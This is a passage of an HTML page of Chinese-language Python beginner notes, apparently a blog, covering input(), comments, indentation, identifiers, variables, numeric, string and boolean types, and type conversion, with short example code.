class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-8 input函数的使用</span></span><span class="line"><span style="color: #ABB2BF">name </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">input</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;请输入你的姓名：&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;我的姓名是：&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> name)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-9 输入整数类型的数据</span></span><span class="line"><span style="color: #ABB2BF">num </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">input</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;请输入您的幸运数字：&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;您的幸运数字是：&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> num)  </span><span style="color: #7F848E; font-style: italic"># 连接成功，说明num是字符串类型</span></span><span class="line"><span style="color: #ABB2BF">num </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">int</span><span style="color: #ABB2BF">(num)  </span><span style="color: #7F848E; font-style: italic"># 使用内置函数int将num转成整数类型</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;您的幸运数字是：&#39;</span><span style="color: #ABB2BF">, num)</span></span></code></pre></div></div></figure><h2 id="4-Python中的注释"><a href="#4-Python中的注释" class="headerlink" title="4. Python中的注释"></a>4. Python中的注释</h2><ul><li>序员在代码中对代码功能解释说明的标注性文字 </li><li>可以提高代码的可读性 </li><li>注释的内容将被Python解释器忽略，不被计算机执行</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h3><p>单行注释，多行注释和中文声明注释</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-10单行注释</span></span><span class="line"><span style="color: #ABB2BF">year </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">input</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;请输入您的出生年份；&#39;</span><span style="color: #ABB2BF">)  </span><span style="color: #7F848E; font-style: italic"># 要求从键盘输入出生年份，要是4位的年份，举例：</span></span><span class="line"><span style="color: #D19A66">1990</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例2-11多行注释</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#coding=utf-8</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#中文声明注释一定要写在第一行</span></span></code></pre></div></div></figure><h2 id="5-代码缩进"><a href="#5-代码缩进" class="headerlink" title="5. 代码缩进"></a>5. 代码缩进</h2><ul><li>是指每行语句开始前的空白区域 </li><li>用来表示Python程序间的包含和层次关系 </li><li>类定义，函数定义，流程控制语句以及异常处理语句等行尾的冒号和下一行的缩进表示一个代码块 的开始，而缩进结束，则表示一个代码块的结束 </li><li>通常情况下采用4个空格作为一个缩进量</li></ul><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 实例2-12 代码缩进</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 一般代码 不需要缩进</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;hello&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;world&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 类的定义</span></span><span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">pass</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 函数的定义</span></span><span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">fun</span><span style="color: #ABB2BF">():</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">pass</span></span></code></pre></div></div></figure><h2 id="6-第二章本章总结"><a href="#6-第二章本章总结" class="headerlink" title="6. 第二章本章总结"></a>6. 第二章本章总结</h2><ul><li>程序设计语言又被称为编程语言 </li><li>计算机程序是使用编程语言组织起来的一组计算机指令 </li><li>计算机指令就是指挥机器工作的指示和命令 </li><li>编程语言可分为机器语言，汇编语言和高级语言 </li><li>采用编译方式执行语言称为静态语言（eg.Java语言） </li><li>采用解释方式执行的语言称为脚本语言（eg.Python语言） </li><li>IPO指的是输入，处理和输出 </li><li>print()函数完整的语法格式：print（value，…，sep&#x3D;’ ‘，end&#x3D;’\n’,file&#x3D;None）</li><li>输入函数input的语法格式为：x&#x3D;input (‘提示文字’) </li><li>Python中的注释可分为单行注释，多行注释和中文声明注释 </li><li>Python语言常用严格的“缩进”来表示程序逻辑</li></ul><h1 id="第三章-数据类型和运算符"><a href="#第三章-数据类型和运算符" class="headerlink" title="第三章 数据类型和运算符"></a>第三章 数据类型和运算符</h1><h2 id="1-保留字与标识符"><a href="#1-保留字与标识符" class="headerlink" title="1.保留字与标识符"></a>1.保留字与标识符</h2><h3 id="1-保留字："><a href="#1-保留字：" class="headerlink" title="1.保留字："></a>1.保留字：</h3><p>指在Python中被赋予特定意义的一些单词，在开发程序时，不可以把这些保留字作为变量，函数，类， 模块和其他对象的名称来使用 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170429695.png" alt="image-20251024141056138"></p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 示例3-1查询Python中的保留字</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> keyword</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(keyword.kwlist)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(keyword.kwlist))  </span><span style="color: #7F848E; font-style: italic"># 获取保留字的个数</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 示例3-2保留字严格区分大小写</span></span><span class="line"><span style="color: #ABB2BF">true </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;真&#39;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># True=&#39;真&#39; # 结果报错</span></span></code></pre></div></div></figure><h3 id="2-Python标识符的命名规则"><a href="#2-Python标识符的命名规则" class="headerlink" title="2.Python标识符的命名规则"></a>2.Python标识符的命名规则</h3><ul><li>可以是字符（英文、中文）、下划线“_”和数字，并且第一个字符不能是数字 </li><li>不能使用Python中的保留字 </li><li>标识符严格区分大小写 </li><li>以下划线开头的标识符有特殊意义，一般应避免使用相似的标识符 </li><li>允许使用中文作为标识符，但不建议使用</li></ul><h3 id="3-Python标识符的命名规范"><a href="#3-Python标识符的命名规范" class="headerlink" title="3.Python标识符的命名规范"></a>3.Python标识符的命名规范</h3><ul><li><p>模块名尽量短小，并且全部使用小写字母，可以使用下划线分割多个字母。 </p><p>例如：grame_main </p></li><li><p>包名尽量短小，并且全部使用小写字母，不推荐使用下划线。 </p><p> 例如：com.ysjpython , 不推荐使用com_ysjpythonb </p></li><li><p>类名采用单词首字母大写形式（Pascal风格）。</p><p>例如：MyClass </p></li><li><p>模块内部的类采用 “_” + Pascal 风格的类名组成， </p><p>例如：在MyClass中的内部类 _InnerMyClass _</p></li><li><p>函数、类的属性和方法的命名，全部使用小写字母，多个字母之间使用下划线分隔 </p></li><li><p>常量命名时采用全部大写字母，可以使用下划线 </p></li><li><p>使用单下划线 “_” 开头的模块变量或函数是受保护的，在使用 “from xxx import *” 语句从模块中导入时，这些模块变量或函数不能被导入 </p></li><li><p>使用双下划线 “__” 开头的实例变量或方法是类私有的 </p></li><li><p>以双下划线开头和结尾的是Python的专用标识， </p><p>例如：__ init __()表示初始化函数</p></li></ul><h2 id="2-变量与常量"><a href="#2-变量与常量" class="headerlink" title="2.变量与常量"></a>2.变量与常量</h2><h3 id="1-变量的语法结构"><a href="#1-变量的语法结构" class="headerlink" title="1.变量的语法结构"></a>1.变量的语法结构</h3><p>变量名&#x3D;value </p><p>举例： luck_number&#x3D;8<br>                 （栈内存） （堆内存）</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 示例3-3变量的定义和使用</span></span><span class="line"><span style="color: #ABB2BF">luck_number </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8</span><span style="color: #ABB2BF">  </span><span style="color: #7F848E; font-style: italic"># 创建一个整型变量luck_number，并为其赋值为8</span></span><span class="line"><span style="color: #ABB2BF">my_name </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;xxx&#39;</span><span style="color: #ABB2BF">  </span><span style="color: #7F848E; font-style: italic"># 字符串类型的变量</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;luck_number的数据类型是：&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #56B6C2">type</span><span style="color: #ABB2BF">(luck_number))</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(my_name,</span><span style="color: #98C379">&#39;的幸运数字是：&#39;</span><span style="color: #ABB2BF">,luck_number)</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Python动态修改变量的数据类型，通过赋不同类型的值就可以直接修改</span></span><span class="line"><span style="color: #ABB2BF">luck_number</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&#39;北京欢迎你&#39;</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;luck_number的数据类型是：&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #56B6C2">type</span><span style="color: #ABB2BF">(luck_number))  </span><span style="color: #7F848E; font-style: italic"># &lt;class &#39;str&#39;&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 在Python中允许多个变量指向同一个值</span></span><span class="line"><span style="color: #ABB2BF">no</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">number</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1024</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(no,number)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">id</span><span style="color: #ABB2BF">(no)) </span><span style="color: #7F848E; font-style: italic"># id()查看对象的内存地址 2799143989456</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">id</span><span style="color: #ABB2BF">(number)) </span><span style="color: #7F848E; font-style: italic"># 2799143989456</span></span></code></pre></div></div></figure><h3 id="2-变量命名应遵循以下几条原则"><a href="#2-变量命名应遵循以下几条原则" class="headerlink" title="2.变量命名应遵循以下几条原则"></a>2.变量命名应遵循以下几条原则</h3><ul><li>变量名必须是一个有效的标识符 </li><li>变量名不能使用Python中的保留字 </li><li>慎用小写字母i（挨）和大写字母O </li><li>应选择有意义的单词作为变量名</li></ul><h3 id="3-常量"><a href="#3-常量" class="headerlink" title="3.常量"></a>3.常量</h3><p>常量就是在程序运行过程中，值不允许改变的量，全部使用大写字母和下划线命名。</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 示例3-4常量的定义</span></span><span class="line"><span style="color: #ABB2BF">pi</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">3.1415926</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic"># 定义了一个变量</span></span><span class="line"><span style="color: #D19A66">PI</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">3.1415926</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic"># 定义了一个常量</span></span></code></pre></div></div></figure><h2 id="3-数值类型"><a href="#3-数值类型" class="headerlink" title="3.数值类型"></a>3.数值类型</h2><h3 id="1-整数类型"><a href="#1-整数类型" class="headerlink" title="1.整数类型"></a>1.整数类型</h3><p>整数类型表示的数值是没有小数部分的数值，包括正整数、负整数和0</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170402143.png" alt="image-20251024141701735"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-5整数的四种表示形式</span></span><span class="line"><span style="color: #abb2bf">num=987 # 默认是十进制，表示整数</span></span><span class="line"><span style="color: #abb2bf">num2=0b1010101 #　使用二进制表示整数</span></span><span class="line"><span style="color: #abb2bf">num3=0o765 # 使用八进制表示整数</span></span><span class="line"><span style="color: #abb2bf">num4=0x87ABF # 使用十六进制表示整数</span></span><span class="line"><span style="color: #abb2bf">print(num)</span></span><span class="line"><span style="color: #abb2bf">print(num2)</span></span><span class="line"><span style="color: #abb2bf">print(num3)</span></span><span class="line"><span style="color: #abb2bf">print(num4)</span></span></code></pre></div></div></figure><h3 id="2-浮点数类型"><a href="#2-浮点数类型" class="headerlink" title="2.浮点数类型"></a>2.浮点数类型</h3><p>浮点数类型表示带有小数点的数值，由整数部分和小数部分组成</p><p><strong>注意事项：</strong> 两个浮点类型的数在进行运算时，有一定的概率运算结果后会增加一些“不确定的”尾数 Python中的复数与数学中的复数形式完全一致，由<strong>实部和虚部</strong>组成</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170453698.png" alt="image-20251024141744741"></p><p>在Python中实数部分使用**.real<strong>表示，虚数部分使用</strong>.imag**表示</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-6浮点数类型的使用</span></span><span class="line"><span style="color: #abb2bf">height = 187.6  # 身高</span></span><span class="line"><span style="color: #abb2bf">print(height)</span></span><span class="line"><span style="color: #abb2bf">print(type(height))  # type()查看height这个变量的数据类型</span></span><span class="line"><span style="color: #abb2bf">x = 10</span></span><span class="line"><span style="color: #abb2bf">y = 10.0</span></span><span class="line"><span style="color: #abb2bf">print(&#39;x的数据类型:&#39;, type(x))  # int</span></span><span class="line"><span style="color: #abb2bf">print(&#39;y的数据类型:&#39;, type(y))  # float</span></span><span class="line"><span style="color: #abb2bf">x = 1.99E1413</span></span><span class="line"><span style="color: #abb2bf">print(&#39;科学记数法:&#39;, x, &#39;x的数据类型：&#39;, type(x))</span></span><span class="line"><span style="color: #abb2bf">print(0.1 + 0.2)  # 不确定的尾数问题0.30000000000000004</span></span><span class="line"><span style="color: #abb2bf">print(round(0.1 + 0.2, 1))  # 0.3</span></span><span class="line"><span style="color: #abb2bf"># 示例3-7复数类型的使用</span></span><span class="line"><span style="color: #abb2bf">x = 123 + 456j</span></span><span class="line"><span style="color: #abb2bf">print(&#39;实数部分：&#39;, x.real)  # 实数部分： 123.0</span></span><span class="line"><span style="color: #abb2bf">print(&#39;虚数部分：&#39;, x.imag)  # 虚数部分： 456.0</span></span></code></pre></div></div></figure><h3 id="3-字符串类型"><a href="#3-字符串类型" class="headerlink" title="3.字符串类型"></a>3.字符串类型</h3><p>字符串类型连续的字符序列，可以表示计算机所能识别的一切字符 </p><p>字符串的界定符：单引号、双引号、三引号</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170455957.png" alt="image-20251024141822557"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170405892.png" alt="image-20251024141829434"></p><p>原字符：使转义字符失效的字符，r或R</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-8字符串类型的使用</span></span><span class="line"><span style="color: #abb2bf">city = &#39;天津&#39;</span></span><span class="line"><span style="color: #abb2bf">address = &#39;天津市宝坻区香江大街3号&#39;</span></span><span class="line"><span style="color: #abb2bf">print(city)</span></span><span class="line"><span style="color: #abb2bf">print(address)</span></span><span class="line"><span style="color: #abb2bf"># 多行字符串</span></span><span class="line"><span style="color: #abb2bf">info = &#39;&#39;&#39;地址：天津市宝坻区香江大街3号</span></span><span class="line"><span style="color: #abb2bf">   收件人：zjh</span></span><span class="line"><span style="color: #abb2bf">   手机号：18800000000</span></span><span class="line"><span style="color: #abb2bf">&#39;&#39;&#39;</span></span><span class="line"><span style="color: #abb2bf">info2=&quot;&quot;&quot;地址：天津市宝坻区香江大街3号</span></span><span class="line"><span style="color: #abb2bf">   收件人：zjh</span></span><span class="line"><span style="color: #abb2bf">   手机号：18800000000</span></span><span class="line"><span style="color: #abb2bf">&quot;&quot;&quot;</span></span><span class="line"><span style="color: #abb2bf">print(info)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;--------------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(info2)</span></span><span class="line"><span style="color: #abb2bf">#示例3-9转义字符的使用</span></span><span class="line"><span style="color: #abb2bf">print(&#39;北京&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;欢迎你&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;--------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;北京\n欢迎你&#39;)  # 遇到\n即换行，可以连续多行</span></span><span class="line"><span style="color: #abb2bf">print(&#39;北\n京\n欢\n迎\n你&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;--------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;北京\t欢迎你&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;hello\toooooo&#39;)  # hello是5个字符，一个制表位是8个字符 8-5=3</span></span><span class="line"><span style="color: #abb2bf">print(&#39;hellooooooo&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;老师说：\&#39;好好学习，天天向上\&#39;&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;老师说：\&quot;好好学习，天天向上\&quot;&#39;)</span></span><span class="line"><span style="color: #abb2bf"># 原字符，使转义字符失效的符号r或R</span></span><span class="line"><span style="color: #abb2bf">print(r&#39;北\n京\n欢\n迎\n你&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(R&#39;北\n京\n欢\n迎\n你&#39;)</span></span></code></pre></div></div></figure><p>字符串又被称为有序的字符序列，对字符串中某个字符的检索称为索引 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170503574.png" alt="image-20251024141900935"></p><p>对字符串中某个子串或区间的检索称为切片</p><h4 id="切片的语法结构"><a href="#切片的语法结构" class="headerlink" title="切片的语法结构"></a>切片的语法结构</h4><p>字符串或字符串变量[N:M]</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-10字符串的索引和切片</span></span><span class="line"><span style="color: #abb2bf">s = &#39;HELLOWORLD&#39;</span></span><span class="line"><span style="color: #abb2bf">print(s[0], s[-10])  # 序号0和序号-10表示的是同一个字符</span></span><span class="line"><span style="color: #abb2bf">print(&#39;北京欢迎你&#39;[4])  # 获取字符串中索引为4</span></span><span class="line"><span style="color: #abb2bf">print(&#39;北京欢迎你&#39;[-1])</span></span><span class="line"><span style="color: #abb2bf">print(&#39;--------------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(s[2:7])  # 从2开始到7结束，不包含7 正向递增</span></span><span class="line"><span style="color: #abb2bf">print(s[-8:-3])  # 反向递减</span></span><span class="line"><span style="color: #abb2bf">print(s[:5])  # 默认N从0开始</span></span><span class="line"><span style="color: #abb2bf">print(s[5:])  # M 默认是切到字符串的结尾</span></span></code></pre></div></div></figure><h4 id="常用的字符串操作"><a href="#常用的字符串操作" class="headerlink" title="常用的字符串操作"></a>常用的字符串操作</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170506733.png" alt="image-20251024142020014"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">#示例3-11字符串类型的操作</span></span><span class="line"><span style="color: #abb2bf">x = &#39;2022年&#39;</span></span><span class="line"><span style="color: #abb2bf">y = &#39;北京冬奥会&#39;</span></span><span class="line"><span style="color: #abb2bf">print(x + y)  # 连接两个字符</span></span><span class="line"><span style="color: #abb2bf">print(x * 10)  # 对x这个字符串的内容复制10次</span></span><span class="line"><span style="color: #abb2bf">print(10 * x)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;北京&#39; in y)  # True</span></span><span class="line"><span style="color: #abb2bf">print(&#39;上海&#39; in y)  # False</span></span></code></pre></div></div></figure><h3 id="4-布尔类型"><a href="#4-布尔类型" class="headerlink" title="4.布尔类型"></a>4.布尔类型</h3><ul><li>用来表示“真”值或“假”值的数据类型 </li><li>在Python中使用标识符True或False标示布尔类型的值 </li><li>True表示整数1，False表示整数0</li></ul><h4 id="布尔值为False的情况如下"><a href="#布尔值为False的情况如下" class="headerlink" title="布尔值为False的情况如下"></a>布尔值为False的情况如下</h4><ul><li>False或者是None </li><li>数值中的0，包含0，0.0，虚数0 </li><li>空序列，包含空字符串、空元组、空列表、空字典、空集合 </li><li>自定义对象的实例，该对象的__bool__()方法返回False或__len__()方法返回0</li></ul><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例3-12布尔类型的使用</span></span><span class="line"><span style="color: #abb2bf">x = True</span></span><span class="line"><span style="color: #abb2bf">print(x)</span></span><span class="line"><span style="color: #abb2bf">print(type(x))</span></span><span class="line"><span style="color: #abb2bf">print(x + 10)  # 11   --&gt;1+10</span></span><span class="line"><span style="color: #abb2bf">print(False + 10)  # 10--&gt;0+10</span></span><span class="line"><span style="color: #abb2bf">print(&#39;-------------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(bool(18))  # 测试一下整数18的布尔值True</span></span><span class="line"><span style="color: #abb2bf">print(bool(0), bool(0.0))  # False</span></span><span class="line"><span style="color: #abb2bf"># 总结，非O的整数的布尔值都是True</span></span><span class="line"><span style="color: #abb2bf">print(bool(&#39;北京欢迎你&#39;))  # True</span></span><span class="line"><span style="color: #abb2bf">print(bool(&#39;&#39;))  # False</span></span><span class="line"><span style="color: #abb2bf"># 所有非空字符串的布尔值都是True</span></span><span class="line"><span style="color: #abb2bf">print(bool(False))</span></span></code></pre></div></div></figure><h3 id="5-数据类型之间的转换"><a href="#5-数据类型之间的转换" class="headerlink" title="5.数据类型之间的转换"></a>5.数据类型之间的转换</h3><ul><li><p>类型转换–&gt;（1）隐式转换 （2）显示转换</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170510003.png" alt="image-20251024142148150"></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170513754.png" alt="image-20251024142156346"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">#示例3-13数据类型之间的转换</span></span><span class="line"><span style="color: #abb2bf">x = 10</span></span><span class="line"><span style="color: #abb2bf">y = 3</span></span><span class="line"><span style="color: #abb2bf">z = x / y  # 执行除法运算的时候，将运算的结果赋值给z</span></span><span class="line"><span style="color: #abb2bf">print(z, type(z))  # 隐式转换，通过运算隐式的转了结果的类型</span></span><span class="line"><span style="color: #abb2bf"># float类型转成int类型，只保留整数部分</span></span><span class="line"><span style="color: #abb2bf">print(&quot;float类型转成int类型：&quot;, int(3.14))</span></span><span class="line"><span style="color: #abb2bf">print(&quot;float类型转成int类型：&quot;, int(3.9))</span></span><span class="line"><span style="color: #abb2bf">print(&quot;float类型转成int类型：&quot;, int(-3.14))</span></span><span class="line"><span style="color: #abb2bf">print(&quot;float类型转成int类型：&quot;, int(-3.9))</span></span><span class="line"><span style="color: #abb2bf"># 将int转成float类型</span></span><span class="line"><span style="color: #abb2bf">print(&#39;将int转成float类型：&#39;, float(10))</span></span><span class="line"><span style="color: #abb2bf"># 将str转成int类型</span></span><span class="line"><span style="color: #abb2bf">print(int(&#39;100&#39;) + int(&#39;200&#39;))</span></span><span class="line"><span style="color: #abb2bf"># 将字符串转成int或float时报错的情况</span></span><span class="line"><span style="color: #abb2bf"># print(int(&#39;18a&#39;)) # ValueError: invalid literal for int() with base 10: </span></span><span class="line"><span style="color: #abb2bf">&#39;18a&#39;</span></span><span class="line"><span style="color: #abb2bf"># print(int(&#39;3.14&#39;)) # ValueError: invalid literal for int() with base 10: </span></span><span class="line"><span style="color: #abb2bf">&#39;3.14&#39;</span></span><span class="line"><span style="color: #abb2bf"># print(float(&#39;45a.987&#39;)) # ValueError: could not convert string to float: </span></span><span class="line"><span style="color: #abb2bf">&#39;45a.987&#39;</span></span><span class="line"><span style="color: #abb2bf"># chr()ord()一对、</span></span><span class="line"><span style="color: #abb2bf">print(ord(&#39;张&#39;))  # 张在unicode表中对应的整数值</span></span><span class="line"><span style="color: #abb2bf">print((chr(24352)))  # 24352整数在unicode表中对应的字符是什么</span></span><span class="line"><span style="color: #abb2bf"># 